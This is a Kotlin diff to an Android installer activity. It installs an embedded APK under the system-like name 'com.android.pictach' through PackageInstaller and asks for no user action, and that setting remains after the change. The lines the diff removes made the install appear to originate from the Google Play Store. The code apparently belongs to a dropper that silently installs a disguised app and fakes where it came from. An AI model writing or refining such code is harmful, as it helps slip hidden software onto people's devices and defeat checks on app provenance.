@@ -3,7 +3,6 @@ package com.cristal.bristral.tristal.mistral
 import android.app.PendingIntent
 import android.content.Intent
 import android.content.pm.PackageInstaller
-import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -21,10 +20,7 @@ class InstallActivity : AppCompatActivity() {
     private val handler = Handler(Looper.getMainLooper())
 
     companion object {
-        private const val INSTALLER_IDENTITY = "com.android.vending"
-        private const val MARKET_URI         = "market://details?id=com.android.pictach"
-        private const val REFERRER_URI       = "android-app://com.android.vending"
-        private const val SESSION_REQUEST    = 1001
+        private const val SESSION_REQUEST = 1001
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -60,17 +56,8 @@ class InstallActivity : AppCompatActivity() {
                 setAppPackageName("com.android.pictach")
                 setSize(apkBytes.size.toLong())
 
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    setOriginatingUri(Uri.parse(MARKET_URI))
-                    setReferrerUri(Uri.parse(REFERRER_URI))
-                }
-
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                     setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
-                }
-
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    setInstallerPackageName(INSTALLER_IDENTITY)
                 }
             }
 
